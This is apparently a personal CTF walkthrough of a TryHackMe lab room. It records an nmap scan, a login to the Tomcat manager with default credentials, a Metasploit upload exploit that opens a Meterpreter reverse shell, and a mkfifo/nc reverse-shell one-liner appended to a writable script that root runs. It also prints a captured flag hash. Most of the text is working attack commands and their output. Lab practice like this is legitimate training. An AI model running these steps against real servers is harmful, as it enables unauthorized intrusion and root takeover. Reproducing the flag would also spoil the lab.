<code>
https://tryhackme.com/room/bsidesgtthompson

┌──(kali㉿kali)-[~/Documents/THM/THM_Thompson]
└─$ nmap   -p- 10.10.29.119       
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-06-18 11:43 CEST
Nmap scan report for 10.10.29.119
Host is up (0.038s latency).
Not shown: 65532 closed tcp ports (conn-refused)
PORT     STATE SERVICE
22/tcp   open  ssh
8009/tcp open  ajp13
8080/tcp open  http-proxy



┌──(kali㉿kali)-[~/Documents/THM/THM_Thompson]
└─$ nmap  -sV -A -p 8080 10.10.29.119
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-06-18 11:45 CEST
Nmap scan report for 10.10.29.119
Host is up (0.035s latency).

PORT     STATE SERVICE VERSION
8080/tcp open  http    Apache Tomcat 8.5.5
|_http-favicon: Apache Tomcat
|_http-title: Apache Tomcat/8.5.5


PORT     STATE SERVICE VERSION
8009/tcp open  ajp13   Apache Jserv (Protocol v1.3)
|_ajp-methods: Failed to get a valid response for the OPTION request

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.77 seconds

## try default passwords and Get
401 Unauthorized

You are not authorized to view this page. If you have not changed any configuration files, please examine the file conf/tomcat-users.xml in your installation. That file must contain the credentials to let you use this webapp.

For example, to add the manager-gui role to a user named tomcat with a password of s3cret, add the following to the config file listed above.

<role rolename="manager-gui"/>
<user username="tomcat" password="s3cret" roles="manager-gui"/>

## Try msfconsole
Module options (exploit/multi/http/tomcat_mgr_upload):

   Name          Current Setting  Required  Description
   ----          ---------------  --------  -----------
   HttpPassword  s3cret           no        The password for the specified username
   HttpUsername  tomcat           no        The username to authenticate as
   Proxies                        no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS        10.10.29.119     yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT         8080             yes       The target port (TCP)
   SSL           false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI     /manager         yes       The URI path of the manager app (/html/upload and /undeploy will be used)
   VHOST                          no        HTTP server virtual host


Payload options (java/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  10.8.28.108      yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Java Universal



View the full module info with the info, or info -d command.

msf6 exploit(multi/http/tomcat_mgr_upload) > run

[*] Started reverse TCP handler on 10.8.28.108:4444 
[*] Retrieving session ID and CSRF token...
[*] Uploading and deploying c7LfPuhpeMX...
[*] Executing c7LfPuhpeMX...
[*] Undeploying c7LfPuhpeMX ...
[*] Sending stage (57971 bytes) to 10.10.29.119
[*] Undeployed at /manager/html/undeploy
[*] Meterpreter session 1 opened (10.8.28.108:4444 -> 10.10.29.119:47342) at 2025-06-18 13:13:42 +0200

meterpreter > id
[-] Unknown command: id. Run the help command for more details.
meterpreter > ls

## Get inital access as user

tomcat@ubuntu:/home/jack$ cat user.txt  
cat user.txt
39400c90bc683a41a8935e4719f181bf



## Privilage Escalation to root
tomcat@ubuntu:/home/jack$ ls -la
ls -la
total 48
drwxr-xr-x 4 jack jack 4096 Aug 23  2019 .
drwxr-xr-x 3 root root 4096 Aug 14  2019 ..
-rw------- 1 root root 1476 Aug 14  2019 .bash_history
-rw-r--r-- 1 jack jack  220 Aug 14  2019 .bash_logout
-rw-r--r-- 1 jack jack 3771 Aug 14  2019 .bashrc
drwx------ 2 jack jack 4096 Aug 14  2019 .cache
-rwxrwxrwx 1 jack jack   26 Aug 14  2019 id.sh
drwxrwxr-x 2 jack jack 4096 Aug 14  2019 .nano
-rw-r--r-- 1 jack jack  655 Aug 14  2019 .profile
-rw-r--r-- 1 jack jack    0 Aug 14  2019 .sudo_as_admin_successful
-rw-r--r-- 1 root root   39 Jun 18 02:17 test.txt
-rw-rw-r-- 1 jack jack   33 Aug 14  2019 user.txt
-rw-r--r-- 1 root root  183 Aug 14  2019 .wget-hsts
tomcat@ubuntu:/home/jack$ cat id.sh
cat id.sh
#!/bin/bash
id > test.txt
tomcat@ubuntu:/home/jack$ echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.8.28.108 9001 >/tmp/f" >> id.sh
</f;cat /tmp/f|sh -i 2>&1|nc 10.8.28.108 9001 >/tmp/f" >> id.sh              

## Get root shell
